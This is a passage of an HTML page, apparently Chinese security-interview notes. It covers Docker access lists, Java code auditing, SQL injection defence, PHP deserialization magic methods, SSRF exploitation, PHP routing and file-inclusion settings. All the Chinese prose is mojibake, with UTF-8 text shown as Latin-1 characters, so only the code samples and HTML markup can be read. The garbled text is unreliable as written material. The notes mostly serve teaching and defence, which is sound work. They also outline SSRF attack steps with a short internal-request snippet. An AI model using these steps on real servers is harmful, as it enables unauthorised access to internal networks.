‡è¯†ç¬¦æ‹¬èµ·æ¥ã€‚</li><li><strong>è½¬ä¹‰å­—ç¬¦</strong>ï¼šä½¿ç”¨æ•°æ®åº“æ”¯æŒçš„è½¬ä¹‰å­—ç¬¦æ¥å¤„ç†ç‰¹æ®Šå­—ç¬¦ã€‚</li></ol><h3 id="åŸºäºé»‘ç™½åå•çš„ä¿®å¤åœ¨Dockerç¯å¢ƒä¸­çš„åº”ç”¨"><a href="#åŸºäºé»‘ç™½åå•çš„ä¿®å¤åœ¨Dockerç¯å¢ƒä¸­çš„åº”ç”¨" class="headerlink" title="åŸºäºé»‘ç™½åå•çš„ä¿®å¤åœ¨Dockerç¯å¢ƒä¸­çš„åº”ç”¨"></a>åŸºäºé»‘ç™½åå•çš„ä¿®å¤åœ¨Dockerç¯å¢ƒä¸­çš„åº”ç”¨</h3><p>åœ¨Dockerç¯å¢ƒä¸­ï¼Œç”±äºIPåœ°å€çš„åŠ¨æ€å˜åŒ–å’Œå®¹å™¨é‡å¯åç¯å¢ƒçš„ä¸ä¸€è‡´æ€§ï¼Œä¼ ç»Ÿçš„åŸºäºIPçš„é»‘ç™½åå•ç­–ç•¥å¯èƒ½ä¸å†é€‚ç”¨ã€‚å¯ä»¥è€ƒè™‘ä»¥ä¸‹æ–¹æ³•æ¥å®ç°é»‘ç™½åå•çš„ä¿®å¤å’Œå®‰å…¨æ§åˆ¶ï¼š</p><ul><li><strong>åŸºäºé•œåƒå’Œå®¹å™¨åç§°çš„é»‘ç™½åå•</strong>ï¼šé€šè¿‡é•œåƒåç§°å’Œæ ‡ç­¾æ¥è¯†åˆ«å’Œæ§åˆ¶å®¹å™¨çš„è¿è¡Œï¼Œè€Œä¸æ˜¯ä¾èµ–IPåœ°å€ã€‚å¯ä»¥åœ¨Dockerå®ˆæŠ¤è¿›ç¨‹é…ç½®ä¸­è®¾ç½®å…è®¸æˆ–ç¦æ­¢è¿è¡Œçš„é•œåƒåˆ—è¡¨ã€‚</li><li><strong>ä½¿ç”¨Dockerç½‘ç»œæ§åˆ¶</strong>ï¼šåˆ©ç”¨Dockerçš„ç½‘ç»œåŠŸèƒ½ï¼Œå¦‚åˆ›å»ºè‡ªå®šä¹‰ç½‘ç»œï¼Œå¹¶é€šè¿‡ç½‘ç»œç­–ç•¥æ¥æ§åˆ¶å®¹å™¨ä¹‹é—´çš„é€šä¿¡ã€‚å¯ä»¥é™åˆ¶æŸäº›å®¹å™¨åªèƒ½ä¸ç‰¹å®šçš„ç½‘ç»œæˆ–ç«¯å£è¿›è¡Œé€šä¿¡ã€‚</li><li><strong>ç»“åˆå®¹å™¨ç¼–æ’å·¥å…·</strong>ï¼šåœ¨ä½¿ç”¨Kubernetesç­‰å®¹å™¨ç¼–æ’å·¥å…·æ—¶ï¼Œå¯ä»¥é€šè¿‡å‘½åç©ºé—´ã€ç½‘ç»œç­–ç•¥ç­‰èµ„æºæ¥å®ç°æ›´ç»†ç²’åº¦çš„è®¿é—®æ§åˆ¶å’Œéš”ç¦»ã€‚</li><li><strong>å®æ–½æœ€å°æƒé™åŸåˆ™</strong>ï¼šä¸ºå®¹å™¨åˆ†é…æœ€å°å¿…è¦çš„æƒé™ï¼Œé¿å…ä½¿ç”¨ç‰¹æƒæ¨¡å¼è¿è¡Œå®¹å™¨ï¼Œå¹¶é™åˆ¶å®¹å™¨å¯¹å®¿ä¸»æœºèµ„æºçš„è®¿é—®ã€‚</li><li><strong>æ—¥å¿—å®¡è®¡ä¸ç›‘æ§</strong>ï¼šé€šè¿‡ç›‘æ§Dockerå®ˆæŠ¤è¿›ç¨‹çš„æ—¥å¿—å’Œå®¹å™¨æ—¥å¿—ï¼ŒåŠæ—¶å‘ç°å’Œå“åº”å¼‚å¸¸æ´»åŠ¨ã€‚</li></ul><h3 id="Javaç³»ç»Ÿä»£ç å®¡è®¡æµç¨‹"><a href="#Javaç³»ç»Ÿä»£ç å®¡è®¡æµç¨‹" class="headerlink" title="Javaç³»ç»Ÿä»£ç å®¡è®¡æµç¨‹"></a>Javaç³»ç»Ÿä»£ç å®¡è®¡æµç¨‹</h3><p>åœ¨æ‹¿åˆ°Javaç³»ç»Ÿçš„ä»£ç æ—¶ï¼Œå®¡è®¡æµç¨‹é€šå¸¸åŒ…æ‹¬ä»¥ä¸‹æ­¥éª¤ï¼š</p><ol><li><strong>ç¯å¢ƒæ­å»º</strong>ï¼šé…ç½®ä¸ç”Ÿäº§ç¯å¢ƒç›¸ä¼¼çš„å¼€å‘å’Œæµ‹è¯•ç¯å¢ƒï¼Œç¡®ä¿ä»£ç èƒ½å¤Ÿæ­£å¸¸è¿è¡Œã€‚</li><li><strong>ä»£ç ç»“æ„åˆ†æ</strong>ï¼šäº†è§£é¡¹ç›®çš„æ•´ä½“æ¶æ„ï¼ŒåŒ…æ‹¬ä½¿ç”¨çš„æ¡†æ¶ã€ç±»åº“ã€æ¨¡å—åˆ’åˆ†ç­‰ã€‚è¯†åˆ«å‡ºå…³é”®ç»„ä»¶å’Œæ•°æ®æµã€‚</li><li><strong>é™æ€ä»£ç åˆ†æ</strong>ï¼šä½¿ç”¨é™æ€ä»£ç åˆ†æå·¥å…·ï¼ˆå¦‚SonarQubeã€FindBugsç­‰ï¼‰æ‰«æä»£ç ï¼Œå‘ç°æ½œåœ¨çš„ä»£ç è´¨é‡é—®é¢˜å’Œå®‰å…¨æ¼æ´ã€‚</li><li><strong>æ•æ„Ÿç‚¹å®¡è®¡</strong>ï¼šé‡ç‚¹å…³æ³¨ä¸å®‰å…¨ç›¸å…³çš„ä»£ç éƒ¨åˆ†ï¼Œå¦‚ç”¨æˆ·è¾“å…¥å¤„ç†ã€èº«ä»½éªŒè¯ã€æˆæƒã€æ•°æ®åŠ å¯†ç­‰ã€‚æ£€æŸ¥æ˜¯å¦å­˜åœ¨SQLæ³¨å…¥ã€XSSã€CSRFç­‰å¸¸è§æ¼æ´ã€‚</li><li><strong>åŠ¨æ€æµ‹è¯•</strong>ï¼šé€šè¿‡å•å…ƒæµ‹è¯•ã€é›†æˆæµ‹è¯•å’Œæ¸—é€æµ‹è¯•ç­‰æ–¹å¼ï¼ŒåŠ¨æ€åœ°å‘ç°è¿è¡Œæ—¶çš„æ¼æ´å’Œé—®é¢˜ã€‚</li><li><strong>ä»£ç å®¡æŸ¥</strong>ï¼šè¿›è¡Œäººå·¥ä»£ç å®¡æŸ¥ï¼Œæ£€æŸ¥ä»£ç çš„é€»è¾‘ã€å®‰å…¨æ€§å’Œè§„èŒƒæ€§ã€‚</li><li><strong>æ¼æ´éªŒè¯ä¸ä¿®å¤</strong>ï¼šå¯¹å‘ç°çš„æ¼æ´è¿›è¡ŒéªŒè¯ï¼Œç¡®å®šå…¶çœŸå®æ€§å’Œå½±å“èŒƒå›´ï¼Œå¹¶æ ¹æ®é£é™©ç­‰çº§åˆ¶å®šä¿®å¤è®¡åˆ’ã€‚</li><li><strong>å›å½’æµ‹è¯•</strong>ï¼šåœ¨ä¿®å¤æ¼æ´åï¼Œè¿›è¡Œå›å½’æµ‹è¯•ï¼Œç¡®ä¿ä¿®å¤æ²¡æœ‰å¼•å…¥æ–°çš„é—®é¢˜ã€‚</li></ol><h3 id="Javaç³»ç»Ÿä¸­SQLæ³¨å…¥çš„é˜²å¾¡ä¸ä¿®å¤"><a href="#Javaç³»ç»Ÿä¸­SQLæ³¨å…¥çš„é˜²å¾¡ä¸ä¿®å¤" class="headerlink" title="Javaç³»ç»Ÿä¸­SQLæ³¨å…¥çš„é˜²å¾¡ä¸ä¿®å¤"></a>Javaç³»ç»Ÿä¸­SQLæ³¨å…¥çš„é˜²å¾¡ä¸ä¿®å¤</h3><h4 id="é˜²å¾¡æªæ–½"><a href="#é˜²å¾¡æªæ–½" class="headerlink" title="é˜²å¾¡æªæ–½"></a>é˜²å¾¡æªæ–½</h4><ol><li><strong>ä½¿ç”¨é¢„ç¼–è¯‘è¯­å¥ï¼ˆPreparedStatementï¼‰</strong>ï¼šé€šè¿‡é¢„ç¼–è¯‘è¯­å¥å°†ç”¨æˆ·è¾“å…¥ä¸SQLå‘½ä»¤åˆ†ç¦»ï¼Œé¿å…ç›´æ¥æ‹¼æ¥SQLå­—ç¬¦ä¸²ã€‚<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;SELECT * FROM users WHERE username = ?&quot;</span>;</span><br><span class="line"><span class="type">PreparedStatement</span> <span class="variable">pstmt</span> <span class="operator">=</span> conn.prepareStatement(sql);</span><br><span class="line">pstmt.setString(<span class="number">1</span>, username);</span><br><span class="line"><span class="type">ResultSet</span> <span class="variable">rs</span> <span class="operator">=</span> pstmt.executeQuery();</span><br></pre></td></tr></table></figure></li><li><strong>ä½¿ç”¨ORMæ¡†æ¶</strong>ï¼šå¦‚Hibernateã€MyBatisç­‰ï¼Œå®ƒä»¬é€šå¸¸ä¼šæä¾›å®‰å…¨çš„APIæ¥å¤„ç†SQLæŸ¥è¯¢ï¼Œé¿å…ç›´æ¥æ‹¼æ¥SQLã€‚</li><li><strong>è¾“å…¥éªŒè¯</strong>ï¼šå¯¹ç”¨æˆ·è¾“å…¥è¿›è¡Œä¸¥æ ¼çš„éªŒè¯ï¼Œé™åˆ¶è¾“å…¥çš„æ ¼å¼å’Œé•¿åº¦ï¼Œç¡®ä¿è¾“å…¥ç¬¦åˆé¢„æœŸã€‚</li><li><strong>æœ€å°æƒé™åŸåˆ™</strong>ï¼šä¸ºæ•°æ®åº“ç”¨æˆ·åˆ†é…æœ€å°å¿…è¦çš„æƒé™ï¼Œé™åˆ¶å…¶åªèƒ½æ‰§è¡Œå¿…è¦çš„æ“ä½œã€‚</li><li><strong>å®šæœŸæ›´æ–°å’Œæ‰“è¡¥ä¸</strong>ï¼šåŠæ—¶æ›´æ–°æ•°æ®åº“ç®¡ç†ç³»ç»Ÿå’Œç›¸å…³åº“ï¼Œä¿®å¤å·²çŸ¥çš„å®‰å…¨æ¼æ´ã€‚</li></ol><h4 id="ä¿®å¤æ–¹æ³•"><a href="#ä¿®å¤æ–¹æ³•" class="headerlink" title="ä¿®å¤æ–¹æ³•"></a>ä¿®å¤æ–¹æ³•</h4><ol><li><strong>æ›¿æ¢ä¸å®‰å…¨çš„JDBCä»£ç </strong>ï¼šå°†ä½¿ç”¨<code>Statement</code>ç›´æ¥æ‹¼æ¥SQLå­—ç¬¦ä¸²çš„ä»£ç æ›¿æ¢ä¸ºä½¿ç”¨<code>PreparedStatement</code>ã€‚</li><li><strong>æ£€æŸ¥å’Œä¿®æ”¹MyBatis&#x2F;Hibernateæ˜ å°„æ–‡ä»¶</strong>ï¼šç¡®ä¿åœ¨MyBatisçš„XMLæ˜ å°„æ–‡ä»¶ä¸­ä½¿ç”¨<code>#&#123;&#125; </code>å ä½ç¬¦ï¼Œè€Œä¸æ˜¯<code>$&#123;&#125;</code>ã€‚</li><li><strong>æ·»åŠ è¾“å…¥éªŒè¯é€»è¾‘</strong>ï¼šåœ¨å¤„ç†ç”¨æˆ·è¾“å…¥çš„åœ°æ–¹æ·»åŠ éªŒè¯é€»è¾‘ï¼Œè¿‡æ»¤æ‰éæ³•å­—ç¬¦å’ŒSQLå…³é”®å­—ã€‚</li><li><strong>ä½¿ç”¨å®‰å…¨çš„åº“å’Œæ¡†æ¶</strong>ï¼šé€‰æ‹©ç»è¿‡å®‰å…¨å®¡è®¡çš„åº“å’Œæ¡†æ¶ï¼Œå¹¶æ­£ç¡®é…ç½®å®ƒä»¬çš„å®‰å…¨ç›¸å…³é€‰é¡¹ã€‚</li><li><strong>è¿›è¡Œå®‰å…¨æµ‹è¯•</strong>ï¼šåœ¨ä¿®å¤åè¿›è¡Œå®‰å…¨æµ‹è¯•ï¼Œç¡®ä¿æ¼æ´å·²å¾—åˆ°è§£å†³ï¼Œå¹¶æ²¡æœ‰å¼•å…¥æ–°çš„é—®é¢˜ã€‚</li></ol><h3 id="ååºåˆ—åŒ–æ—¶çš„é­”æœ¯æ–¹æ³•å…¥æ‰‹ç‚¹"><a href="#ååºåˆ—åŒ–æ—¶çš„é­”æœ¯æ–¹æ³•å…¥æ‰‹ç‚¹" class="headerlink" title="ååºåˆ—åŒ–æ—¶çš„é­”æœ¯æ–¹æ³•å…¥æ‰‹ç‚¹"></a>ååºåˆ—åŒ–æ—¶çš„é­”æœ¯æ–¹æ³•å…¥æ‰‹ç‚¹</h3><p>åœ¨PHPä¸­ï¼Œå½“ä½¿ç”¨<code>unserialize()</code>ååºåˆ—åŒ–ä¸€ä¸ªå­—ç¬¦ä¸²æ—¶ï¼Œå¯¹è±¡çš„ä»¥ä¸‹é­”æœ¯æ–¹æ³•å¯èƒ½ä¼šè¢«è‡ªåŠ¨è°ƒç”¨ï¼Œå¯ä»¥ä½œä¸ºå¯»æ‰¾ååºåˆ—åŒ–é“¾çš„å…¥æ‰‹ç‚¹ï¼š</p><ol><li>**<code>__wakeup()</code>**ï¼š<ul><li>å½“å¯¹è±¡è¢«ååºåˆ—åŒ–æ—¶ï¼Œå¦‚æœå®šä¹‰äº†<code>__wakeup()</code>æ–¹æ³•ï¼Œè¯¥æ–¹æ³•ä¼šè¢«è°ƒç”¨ã€‚å¯ä»¥åœ¨è¿™ä¸ªæ–¹æ³•ä¸­æ‰§è¡Œä¸€äº›åˆå§‹åŒ–æ“ä½œï¼Œä½†ä¹Ÿå¯ä»¥è¢«åˆ©ç”¨æ¥æ‰§è¡Œæ¶æ„ä»£ç ã€‚</li></ul></li><li>**<code>__destruct()</code>**ï¼š<ul><li>å½“å¯¹è±¡è¢«é”€æ¯æ—¶ï¼Œå¦‚æœå®šä¹‰äº†<code>__destruct()</code>æ–¹æ³•ï¼Œè¯¥æ–¹æ³•ä¼šè¢«è°ƒç”¨ã€‚åœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­ï¼Œå¦‚æœå¯¹è±¡åœ¨ååºåˆ—åŒ–åç«‹å³è¢«é”€æ¯ï¼Œå¯èƒ½ä¼šè§¦å‘<code>__destruct()</code>æ–¹æ³•ä¸­çš„ä»£ç ã€‚</li></ul></li><li>**<code>__toString()</code>**ï¼š<ul><li>å½“å¯¹è±¡è¢«å½“ä½œå­—ç¬¦ä¸²ä½¿ç”¨æ—¶ï¼Œå¦‚æœå®šä¹‰äº†<code>__toString()</code>æ–¹æ³•ï¼Œè¯¥æ–¹æ³•ä¼šè¢«è°ƒç”¨ã€‚åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œååºåˆ—åŒ–åçš„å¯¹è±¡å¯èƒ½ä¼šè¢«éšå¼è½¬æ¢ä¸ºå­—ç¬¦ä¸²ï¼Œä»è€Œè§¦å‘<code>__toString()</code>æ–¹æ³•ã€‚</li></ul></li><li>**<code>__call()</code>**ï¼š<ul><li>å½“è°ƒç”¨å¯¹è±¡ä¸­ä¸å­˜åœ¨çš„æ–¹æ³•æ—¶ï¼Œå¦‚æœå®šä¹‰äº†<code>__call()</code>æ–¹æ³•ï¼Œè¯¥æ–¹æ³•ä¼šè¢«è°ƒç”¨ã€‚åœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­ï¼Œå¦‚æœå¯¹è±¡çš„æ–¹æ³•è°ƒç”¨è¢«è§¦å‘ï¼Œå¯èƒ½ä¼šæ‰§è¡Œ<code>__call()</code>æ–¹æ³•ä¸­çš„ä»£ç ã€‚</li></ul></li><li>**<code>__get()</code>å’Œ<code>__set()</code>**ï¼š<ul><li>å½“è®¿é—®æˆ–è®¾ç½®å¯¹è±¡ä¸­ä¸å­˜åœ¨çš„å±æ€§æ—¶ï¼Œå¦‚æœå®šä¹‰äº†<code>__get()</code>å’Œ<code>__set()</code>æ–¹æ³•ï¼Œè¿™äº›æ–¹æ³•ä¼šè¢«è°ƒç”¨ã€‚åœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­ï¼Œå¦‚æœå¯¹è±¡çš„å±æ€§è¢«è®¿é—®æˆ–è®¾ç½®ï¼Œå¯èƒ½ä¼šè§¦å‘è¿™äº›æ–¹æ³•ã€‚</li></ul></li></ol><h3 id="åœ¨PHPç¯å¢ƒä¸‹åˆ©ç”¨SSRF"><a href="#åœ¨PHPç¯å¢ƒä¸‹åˆ©ç”¨SSRF" class="headerlink" title="åœ¨PHPç¯å¢ƒä¸‹åˆ©ç”¨SSRF"></a>åœ¨PHPç¯å¢ƒä¸‹åˆ©ç”¨SSRF</h3><p>æœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ ï¼ˆSSRFï¼‰æ˜¯ä¸€ç§å®‰å…¨æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æœåŠ¡å™¨ç«¯å‘èµ·çš„è¯·æ±‚æ¥è®¿é—®æœåŠ¡å™¨å†…éƒ¨ç½‘ç»œæˆ–æœåŠ¡ã€‚åœ¨PHPç¯å¢ƒä¸‹ï¼Œåˆ©ç”¨SSRFè·å–shellæˆ–è¿›å…¥å†…ç½‘çš„æ–¹æ³•å¦‚ä¸‹ï¼š</p><ol><li><strong>è¯†åˆ«ç›®æ ‡æœåŠ¡å™¨çš„å†…éƒ¨ç½‘ç»œç»“æ„</strong>ï¼šäº†è§£ç›®æ ‡æœåŠ¡å™¨æ‰€åœ¨çš„å†…éƒ¨ç½‘ç»œç»“æ„ï¼ŒåŒ…æ‹¬å†…ç½‘IPåœ°å€èŒƒå›´ã€åŸŸåç­‰ä¿¡æ¯ã€‚</li><li><strong>æ„é€ æ¶æ„è¯·æ±‚</strong>ï¼šåˆ©ç”¨PHPä¸­çš„ç½‘ç»œè¯·æ±‚å‡½æ•°ï¼Œå¦‚<code>file_get_contents()</code>ã€<code>curl</code>ç­‰ï¼Œæ„é€ æ¶æ„è¯·æ±‚ï¼Œè®¿é—®å†…ç½‘èµ„æºã€‚<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$url</span> = <span class="string">&#x27;http://å†…ç½‘IP:ç«¯å£/è·¯å¾„&#x27;</span>;</span><br><span class="line"><span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$content</span>;</span><br></pre></td></tr></table></figure></li><li><strong>åˆ©ç”¨ä¸­é—´äººæ”»å‡»</strong>ï¼šåœ¨å†…ç½‘ä¸­è®¾ç½®ä¸€ä¸ªæ¶æ„æœåŠ¡å™¨ï¼Œé€šè¿‡SSRFä½¿ç›®æ ‡æœåŠ¡å™¨å‘è¯¥æ¶æ„æœåŠ¡å™¨å‘é€è¯·æ±‚ï¼Œä»è€Œè·å–ç›®æ ‡æœåŠ¡å™¨çš„ç›¸å…³ä¿¡æ¯ã€‚</li><li><strong>åˆ©ç”¨æœåŠ¡å™¨çš„æ¼æ´æˆ–å¼±é…ç½®</strong>ï¼šå¦‚æœç›®æ ‡æœåŠ¡å™¨å­˜åœ¨æœªæˆæƒè®¿é—®ã€ç›®å½•éå†ç­‰æ¼æ´ï¼Œå¯ä»¥é€šè¿‡SSRFåˆ©ç”¨è¿™äº›æ¼æ´è·å–æ›´å¤šæƒé™æˆ–ä¿¡æ¯ã€‚</li><li><strong>ç»“åˆå…¶ä»–æ¼æ´</strong>ï¼šå°†SSRFä¸å…¶ä»–æ¼æ´ï¼ˆå¦‚å‘½ä»¤æ³¨å…¥ã€æ–‡ä»¶åŒ…å«ç­‰ï¼‰ç»“åˆä½¿ç”¨ï¼Œæ‰©å¤§æ”»å‡»é¢ã€‚</li></ol><h3 id="PHPä»£ç å¸¸è§å…¥å£å‡½æ•°çš„æŸ¥æ‰¾"><a href="#PHPä»£ç å¸¸è§å…¥å£å‡½æ•°çš„æŸ¥æ‰¾" class="headerlink" title="PHPä»£ç å¸¸è§å…¥å£å‡½æ•°çš„æŸ¥æ‰¾"></a>PHPä»£ç å¸¸è§å…¥å£å‡½æ•°çš„æŸ¥æ‰¾</h3><p>åœ¨PHPä»£ç å®¡è®¡ä¸­ï¼Œæ‰¾åˆ°å¸¸è§çš„å…¥å£å‡½æ•°æ˜¯å…³é”®ï¼Œå› ä¸ºè¿™äº›å‡½æ•°å¾€å¾€æ˜¯å¤„ç†ç”¨æˆ·è¾“å…¥å’Œä¸šåŠ¡é€»è¾‘çš„èµ·ç‚¹ã€‚ä»¥ä¸‹æ˜¯ä¸€äº›å¸¸è§çš„å…¥å£å‡½æ•°åŠå…¶æŸ¥æ‰¾æ–¹æ³•ï¼š</p><ol><li><strong>å‰ç«¯æ§åˆ¶å™¨æ¨¡å¼</strong>ï¼šè®¸å¤šPHPæ¡†æ¶é‡‡ç”¨å‰ç«¯æ§åˆ¶å™¨æ¨¡å¼ï¼Œæ‰€æœ‰è¯·æ±‚éƒ½é€šè¿‡ä¸€ä¸ªå…¥å£æ–‡ä»¶ï¼ˆå¦‚<code>index.php</code>ï¼‰è¿›è¡Œå¤„ç†ã€‚åœ¨è¿™äº›æ–‡ä»¶ä¸­ï¼Œé€šå¸¸ä¼šæ‰¾åˆ°è·¯ç”±åˆ†å‘ã€è¯·æ±‚å¤„ç†ç­‰å…¥å£å‡½æ•°ã€‚</li><li><strong>è·¯ç”±é…ç½®</strong>ï¼šåœ¨åŸºäºæ¡†æ¶çš„é¡¹ç›®ä¸­ï¼Œè·¯ç”±é…ç½®æ–‡ä»¶å®šä¹‰äº†URLåˆ°æ§åˆ¶å™¨æ–¹æ³•çš„æ˜ å°„ã€‚é€šè¿‡åˆ†æè·¯ç”±é…ç½®ï¼Œå¯ä»¥æ‰¾åˆ°å¤„ç†ç‰¹å®šè¯·æ±‚çš„å…¥å£å‡½æ•°ã€‚</li><li><strong>å‡½æ•°è°ƒç”¨å›¾</strong>ï¼šä½¿ç”¨é™æ€åˆ†æå·¥å…·ç”Ÿæˆå‡½æ•°è°ƒç”¨å›¾ï¼Œæ‰¾å‡ºè¢«é¢‘ç¹è°ƒç”¨çš„å‡½æ•°ï¼Œè¿™äº›å‡½æ•°å¯èƒ½æ˜¯ä¸šåŠ¡é€»è¾‘çš„å…¥å£ã€‚</li><li><strong>ç”¨æˆ·è¾“å…¥å¤„ç†</strong>ï¼šæŸ¥æ‰¾å¤„ç†ç”¨æˆ·è¾“å…¥çš„å‡½æ•°ï¼Œå¦‚<code>$_GET</code>ã€<code>$_POST</code>ã€<code>$_REQUEST</code>ç­‰è¶…å…¨å±€å˜é‡çš„ä½¿ç”¨ä½ç½®ï¼Œè¿™äº›ä½ç½®å¾€å¾€æ˜¯å…¥å£ç‚¹ã€‚</li><li><strong>æ¡†æ¶ç‰¹å®šå…¥å£</strong>ï¼šå¯¹äºç‰¹å®šçš„PHPæ¡†æ¶ï¼ˆå¦‚ThinkPHPã€Laravelç­‰ï¼‰ï¼Œäº†è§£å…¶è¯·æ±‚å¤„ç†æµç¨‹å’Œå…¥å£æ–‡ä»¶ç»“æ„ï¼Œå¯ä»¥ç›´æ¥å®šä½åˆ°ç›¸å…³çš„å…¥å£å‡½æ•°ã€‚</li></ol><h3 id="PHPå¼€å‘æ¡†æ¶çš„URLè·¯ç”±æ–¹æ³•"><a href="#PHPå¼€å‘æ¡†æ¶çš„URLè·¯ç”±æ–¹æ³•" class="headerlink" title="PHPå¼€å‘æ¡†æ¶çš„URLè·¯ç”±æ–¹æ³•"></a>PHPå¼€å‘æ¡†æ¶çš„URLè·¯ç”±æ–¹æ³•</h3><p>ä¸åŒçš„PHPå¼€å‘æ¡†æ¶æœ‰ä¸åŒçš„URLè·¯ç”±æœºåˆ¶ï¼Œä»¥ä¸‹æ˜¯ä¸€äº›å¸¸è§æ¡†æ¶çš„è·¯ç”±æ–¹æ³•ï¼š</p><ul><li><strong>ThinkPHP</strong>ï¼šé€šè¿‡<code>Route</code>ç±»è¿›è¡Œè·¯ç”±å®šä¹‰ï¼Œæ”¯æŒèµ„æºè·¯ç”±ã€åˆ†ç»„è·¯ç”±ç­‰å¤šç§æ–¹å¼ã€‚ä¾‹å¦‚ï¼š<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Route</span>::<span class="title function_ invoke__">get</span>(<span class="string">&#x27;blog/:id&#x27;</span>, <span class="string">&#x27;Blog/index&#x27;</span>);</span><br></pre></td></tr></table></figure></li><li><strong>Laravel</strong>ï¼šä½¿ç”¨<code>Route</code>é—¨é¢å®šä¹‰è·¯ç”±ï¼Œæ”¯æŒGETã€POSTç­‰HTTPåŠ¨è¯ï¼Œä»¥åŠè·¯ç”±å‚æ•°ã€ä¸­é—´ä»¶ç­‰ã€‚ä¾‹å¦‚ï¼š<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Route</span>::<span class="title function_ invoke__">get</span>(<span class="string">&#x27;/user/&#123;id&#125;&#x27;</span>, function (<span class="variable">$id</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;User &#x27;</span>.<span class="variable">$id</span>;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></li><li><strong>Symfony</strong>ï¼šé€šè¿‡æ³¨è§£æˆ–YAMLé…ç½®æ–‡ä»¶å®šä¹‰è·¯ç”±ï¼Œä¸æ§åˆ¶å™¨æ–¹æ³•å…³è”ã€‚ä¾‹å¦‚ï¼š<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">app_user:</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">/user/&#123;id&#125;</span></span><br><span class="line">    <span class="attr">controller:</span> <span class="string">App\Controller\UserController::index</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="è¿œç¨‹æ–‡ä»¶åŒ…å«å’Œæœ¬åœ°æ–‡ä»¶åŒ…å«æ¶‰åŠçš„PHPè®¾ç½®"><a href="#è¿œç¨‹æ–‡ä»¶åŒ…å«å’Œæœ¬åœ°æ–‡ä»¶åŒ…å«æ¶‰åŠçš„PHPè®¾ç½®" class="headerlink" title="è¿œç¨‹æ–‡ä»¶åŒ…å«å’Œæœ¬åœ°æ–‡ä»¶åŒ…å«æ¶‰åŠçš„PHPè®¾ç½®"></a>è¿œç¨‹æ–‡ä»¶åŒ…å«å’Œæœ¬åœ°æ–‡ä»¶åŒ…å«æ¶‰åŠçš„PHPè®¾ç½®</h3><p>è¿œç¨‹æ–‡ä»¶åŒ…å«å’Œæœ¬åœ°æ–‡ä»¶åŒ…å«æ˜¯PHPä¸­å¸¸è§çš„æ–‡ä»¶åŒ…å«æ¼æ´ç±»å‹ï¼Œå®ƒä»¬æ¶‰åŠçš„PHPè®¾ç½®å¦‚ä¸‹ï¼š</p><ul><li><strong>allow_url_fopen</strong>ï¼šæ§åˆ¶æ˜¯å¦å…è®¸ä½¿ç”¨<code>file_get_contents()</code>ã€<code>fopen()</code>ç­‰å‡½æ•°è®¿é—®è¿œç¨‹æ–‡ä»¶ã€‚é»˜è®¤å€¼ä¸º<code>On</code>ï¼Œå¼€å¯æ—¶å…è®¸è¿œç¨‹æ–‡ä»¶åŒ…å«ã€‚</li><li><strong>allow_url_include</strong>ï¼šæ§åˆ¶æ˜¯å¦å…è®¸åœ¨<code>include</code>ã€<code>require</code>ç­‰è¯­å¥ä¸­åŠ è½½è¿œç¨‹æ–‡ä»¶ã€‚é»˜è®¤å€¼ä¸º<code>Off</code>ï¼Œå…³é—­æ—¶ç¦æ­¢è¿œç¨‹æ–‡ä»¶åŒ…å«ã€‚</li><li><strong>open_basedir</strong>ï¼šé™åˆ¶PHPè„šæœ¬å¯ä»¥è®¿é—®çš„æ–‡ä»¶ç³»ç»Ÿè·¯å¾„ï¼Œç”¨äºé™åˆ¶æœ¬åœ°æ–‡ä»¶åŒ…å«çš„èŒƒå›´ã€‚</li></ul><h3 id="æœ¬åœ°æ–‡ä»¶åŒ…å«çš„PHPé…ç½®é™åˆ¶"><a href="#æœ¬åœ°æ–‡ä»¶åŒ…å«çš„PHPé…ç½®é™åˆ¶" class="headerlink" title="æœ¬åœ°æ–‡ä»¶åŒ…å«çš„PHPé…ç½®é™åˆ¶"></a>æœ¬åœ°æ–‡ä»¶åŒ…å«çš„PHPé…ç½®é™åˆ¶</h3><p>å¯ä»¥é€šè¿‡ä¿®æ”¹PHPé…ç½®æ–‡ä»¶<code>php.ini</code>ä¸­çš„<code>open_basedir</code>è®¾ç½®æ¥é™åˆ¶æœ¬åœ°æ–‡ä»¶åŒ…å«çš„è·¯å¾„ã€‚ä¾‹å¦‚ï¼š</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">open_basedir</span> = /safe_mode_dir</span><br></pre></td></tr></table></figure><p>è¿™æ ·ï¼ŒPHPè„šæœ¬åªèƒ½è®¿é—®<code>/safe_mode_dir</code>åŠå…¶å­ç›®å½•ä¸­çš„æ–‡ä»¶ï¼Œä»è€Œé™åˆ¶äº†æœ¬åœ°æ–‡ä»¶åŒ…å«çš„èŒƒå›´ã€‚</p><h3 id="PHPåœ¨åšSQLæ³¨å…¥é˜²å¾¡æ—¶çš„æ–¹æ³•"><a href="#PHPåœ¨åšSQLæ³¨å…¥é˜²å¾¡æ—¶çš„æ–¹æ³•" class="headerlink" 